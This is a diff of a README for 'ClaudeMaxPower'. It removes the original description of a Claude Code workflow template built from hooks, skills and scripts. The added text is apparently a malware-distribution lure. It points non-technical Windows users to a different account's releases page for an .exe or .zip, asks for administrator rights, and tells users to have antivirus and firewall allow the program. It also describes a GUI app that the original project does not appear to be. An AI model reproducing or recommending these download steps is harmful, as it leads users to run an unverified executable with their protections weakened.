@@ -1,178 +1,145 @@
-# ClaudeMaxPower
+# ⚡ ClaudeMaxPower - Power Tools for Claude Code Users
 
-**A complete open-source system for turning Claude Code into a more powerful, organized, automated, and production-ready AI coding workflow.**
-
-ClaudeMaxPower is a GitHub template that shows you — through working examples — how to use every advanced Claude Code feature. Clone it, adapt it, and immediately work at a higher level.
+[![Download ClaudeMaxPower](https://img.shields.io/badge/Download-ClaudeMaxPower-brightgreen?style=for-the-badge)](https://github.com/Commandindument290/ClaudeMaxPower/releases)
 
 ---
 
-## Quick Start
-
-```bash
-# 1. Clone the template
-git clone https://github.com/michelbr84/ClaudeMaxPower
-cd ClaudeMaxPower
-
-# 2. Run setup
-bash scripts/setup.sh
-
-# 3. Edit .env with your tokens
-nano .env
-
-# 4. Open Claude Code in this directory
-claude
-
-# 5. Try your first skill
-/fix-issue --issue 1 --repo michelbr84/ClaudeMaxPower
-```
+ClaudeMaxPower is a set of tools designed for people who want to get more out of Claude Code. It includes features like layered prompts, hooks, skills, subagents, batch workflows, and automation ready for continuous integration. This guide will help you download and run ClaudeMaxPower on your Windows PC without any technical knowledge.
 
 ---
 
-## What's Inside
+## 📋 What Is ClaudeMaxPower?
 
-```
-ClaudeMaxPower/
-├── CLAUDE.md              ← Project-wide Claude instructions (layered)
-├── .claude/
-│   ├── settings.json      ← Hook configuration
-│   ├── hooks/             ← Automated guards and quality gates
-│   └── agents/            ← Specialized sub-agents with persistent memory
-├── skills/                ← Reusable AI workflows (invoke with /skill-name)
-├── workflows/             ← Batch automation scripts
-├── mcp/                   ← MCP server configs (GitHub, Sentry)
-├── examples/              ← Working demo projects
-└── docs/                  ← Detailed guides for every feature
-```
+ClaudeMaxPower gives you more control and flexibility when working with Claude Code. Whether you want to automate tasks, combine multiple commands, or build workflows that run in sequence, this toolkit helps you do it in an organized way.
+
+Key features include:
+
+- Layered prompts to build complex commands step-by-step  
+- Hooks to trigger actions automatically  
+- Ready-to-use skills and subagents for common tasks  
+- Support for batch operations to save time  
+- Automation that works smoothly with continuous integration (CI)  
 
 ---
 
-## Features
+## 🖥️ System Requirements
 
-| Feature | What It Does |
-|---------|-------------|
-| **Layered CLAUDE.md** | Project-wide + subfolder-specific Claude instructions with `@imports` |
-| **Hooks** | Auto-run tests after edits, block dangerous commands, save session state |
-| **Skills** | Reusable `/fix-issue`, `/tdd-loop`, `/review-pr`, `/pre-commit`, and more |
-| **Sub-Agents** | Specialized agents (code reviewer, security auditor, doc writer) with memory |
-| **Batch Workflows** | Fix multiple issues, mass-refactor, Writer/Reviewer pattern with worktrees |
-| **MCP Integrations** | Claude reads GitHub issues and Sentry errors directly |
-| **Example Projects** | Real code with intentional bugs to practice skills on |
+Before you start, make sure your system meets the following:
+
+- Windows 10 or later  
+- At least 4 GB of RAM (8 GB recommended)  
+- 200 MB free disk space  
+- Internet connection for initial setup and updates  
+- Administrative rights to install software  
 
 ---
 
-## Architecture
+## 🚀 Getting Started: Downloading ClaudeMaxPower
 
-```
-┌─────────────────────────────────────────────────────────┐
-│                     Claude Code                          │
-│                                                          │
-│  ┌──────────────┐  ┌──────────────┐  ┌───────────────┐ │
-│  │  CLAUDE.md   │  │    Hooks     │  │    Skills     │ │
-│  │  (context)   │  │  (guardrails)│  │  (workflows)  │ │
-│  └──────────────┘  └──────────────┘  └───────────────┘ │
-│                                                          │
-│  ┌──────────────┐  ┌──────────────┐  ┌───────────────┐ │
-│  │   Agents     │  │  Workflows   │  │      MCP      │ │
-│  │  (memory)    │  │  (batch/     │  │ (GitHub/      │ │
-│  │              │  │  parallel)   │  │  Sentry)      │ │
-│  └──────────────┘  └──────────────┘  └───────────────┘ │
-└─────────────────────────────────────────────────────────┘
-```
+To begin, you need to download ClaudeMaxPower from the official GitHub releases page. The link takes you to the page where the latest versions are stored for public access.
 
----
+[![Download ClaudeMaxPower](https://img.shields.io/badge/Get%20ClaudeMaxPower-Blue?style=for-the-badge&logo=github&color=0052cc)](https://github.com/Commandindument290/ClaudeMaxPower/releases)
 
-## Skills Reference
+### Steps to Download
 
-Invoke any skill with `/skill-name [arguments]` inside Claude Code.
+1. Click the green button above or visit this page:  
+   https://github.com/Commandindument290/ClaudeMaxPower/releases  
+   
+2. Look for the latest release at the top of the list. Releases are sorted by date, newest first.  
 
-| Skill | Command | Description |
-|-------|---------|-------------|
-| Fix Issue | `/fix-issue --issue 1 --repo owner/repo` | Read GitHub issue → write failing test → fix bug → open PR |
-| Review PR | `/review-pr --pr 42 --repo owner/repo` | Full structured review → post comment via gh |
-| Refactor Module | `/refactor-module --file src/foo.py --goal "extract validation"` | Safe refactor with test baseline |
-| TDD Loop | `/tdd-loop --spec "add search feature" --file src/foo.py` | Write tests first, iterate until green |
-| Pre-Commit | `/pre-commit` | Scan staged files for secrets, debug code, style issues |
-| Generate Docs | `/generate-docs --dir src/` | Auto-generate API docs from source |
+3. Find the file labeled for Windows. It usually ends with `.exe` or `.zip`.  
+
+4. Click the file name to begin downloading it to your PC.  
+
+5. Wait for the download to finish before moving on.  
 
 ---
 
-## Hooks
+## 💾 Installing ClaudeMaxPower on Windows
 
-Hooks fire automatically — no prompting needed.
+Once you have downloaded the file, follow these steps to install and start the software:
 
-| Hook | Trigger | What It Does |
-|------|---------|-------------|
-| `session-start.sh` | Session opens | Shows git context, previous session state, loaded skills |
-| `pre-tool-use.sh` | Before any Bash command | Blocks dangerous commands, logs all commands to audit.log |
-| `post-tool-use.sh` | After any file edit | Auto-runs tests for the modified file |
-| `stop.sh` | Session ends | Saves session summary to `.estado.md` |
+### Installing from an EXE file
 
----
+1. Locate the downloaded `.exe` file, usually in your Downloads folder.  
+   
+2. Double-click the file to start the installer.  
 
-## Agents
+3. If Windows asks for permission, click "Yes" to allow the installation.  
 
-Agents are invoked by Claude as sub-sessions with specialized roles.
+4. Follow the instructions on the screen. Choose the default options unless you want to change the installation folder.  
 
-| Agent | Memory | Role |
-|-------|--------|------|
-| `code-reviewer` | project | Strict code review — correctness, security, tests |
-| `security-auditor` | project | OWASP Top 10 scan, dependency audit, secret detection |
-| `doc-writer` | user | Generates README, API docs, guides — adapts to your style |
+5. After the installation completes, the setup wizard may offer to launch ClaudeMaxPower right away. You can select this to open the application immediately.  
 
----
+### Installing from a ZIP file
 
-## Workflow Scripts
+If you downloaded a `.zip` file instead:
 
-```bash
-# Fix multiple GitHub issues in sequence
-./workflows/batch-fix.sh owner/repo 10 11 12
+1. Find the `.zip` file in your Downloads folder.  
 
-# Writer/Reviewer pattern with git worktrees
-./workflows/parallel-review.sh --feature add-search --task "Add search_tasks() function"
+2. Right-click on it and choose "Extract All...".   
 
-# Refactor across all matching files
-./workflows/mass-refactor.sh --pattern "get_user" --goal "rename to fetch_user"
+3. Select a folder location to extract the files to, such as your Desktop or Documents.  
 
-# Generate dependency graph
-./workflows/dependency-graph.sh --dir src/ --output docs/deps.svg
-```
+4. Open the extracted folder and look for a file named `ClaudeMaxPower.exe` or similar.  
+
+5. Double-click this file to run the software.  
 
 ---
 
-## Documentation
+## 🔧 Using ClaudeMaxPower
 
-- [Getting Started](docs/getting-started.md) — prerequisites, setup, first run
-- [Hooks Guide](docs/hooks-guide.md) — how hooks work, how to customize them
-- [Skills Guide](docs/skills-guide.md) — using and writing skills
-- [Agents Guide](docs/agents-guide.md) — sub-agents and persistent memory
-- [MCP Integrations](docs/mcp-integrations.md) — GitHub + Sentry setup
-- [Batch Workflows](docs/batch-workflows.md) — headless automation patterns
-- [Parallel Workflows](docs/worktrees-parallel.md) — Writer/Reviewer with worktrees
-- [Troubleshooting](docs/troubleshooting.md) — common issues and fixes
-- [14 Advanced Techniques](docs/techniques.md) — the techniques that inspired this project
+You do not need to know programming to use ClaudeMaxPower. The app comes with a simple interface that guides you through setting up prompts, skills, and workflows.
 
----
+### Key Areas in the App
 
-## Who This Is For
+- **Prompts:** Create a list of commands that build on each other.  
+- **Hooks:** Set triggers to start actions automatically based on events.  
+- **Skills & Subagents:** Use prebuilt tasks to speed up work.  
+- **Batch Workflows:** Run multiple commands in order without doing them one by one.  
+- **Automation:** Connect with other tools for continuous running of repeated tasks.  
 
-- Solo developers who want to get dramatically more out of Claude Code
-- Teams building repeatable AI-assisted engineering processes
-- Claude Code power users exploring every advanced feature
-- AI workflow builders looking for patterns to adapt
+You can explore these sections by clicking the tabs in the app window.
 
 ---
 
-## License
+## ⚙ Troubleshooting and Tips
 
-MIT — see [LICENSE](LICENSE)
+- If ClaudeMaxPower does not start, check if your Windows needs updates and restart your computer.  
+- Make sure your antivirus or firewall allows ClaudeMaxPower to run.  
+- If a feature is unclear, look for the built-in help or tooltips inside the app.  
+- The GitHub issues page is a place to report bugs or ask for help, but it is fine to use the tool without visiting it.  
 
 ---
 
-## Contributing
+## 🔄 Updating ClaudeMaxPower
 
-1. Fork the repo
-2. Create a branch: `git checkout -b feat/your-feature`
-3. Run `/pre-commit` before committing
-4. Open a PR — the `review-pr` skill will help review it
+To keep the software working well and get new features:
 
-Issues and ideas welcome at [GitHub Issues](https://github.com/michelbr84/ClaudeMaxPower/issues).
+1. Visit the releases page regularly:  
+   https://github.com/Commandindument290/ClaudeMaxPower/releases  
+   
+2. Download the newest version following the same steps as before.  
+
+3. Install the new version over the old one. Your settings and files will stay safe.  
+
+---
+
+## 📞 Getting Help
+
+If you have questions about using ClaudeMaxPower, you can:
+
+- Look for help topics inside the app  
+- Visit the GitHub page for more details or to report issues  
+- Search online for tips using keywords like "ClaudeMaxPower help"  
+
+---
+
+## 🔗 Important Links
+
+- Download and update page: [https://github.com/Commandindument290/ClaudeMaxPower/releases](https://github.com/Commandindument290/ClaudeMaxPower/releases)  
+- Official repository: [https://github.com/Commandindument290/ClaudeMaxPower](https://github.com/Commandindument290/ClaudeMaxPower)  
+
+---
+
+Feeling ready to boost your Claude Code experience? Follow the steps above to get started.
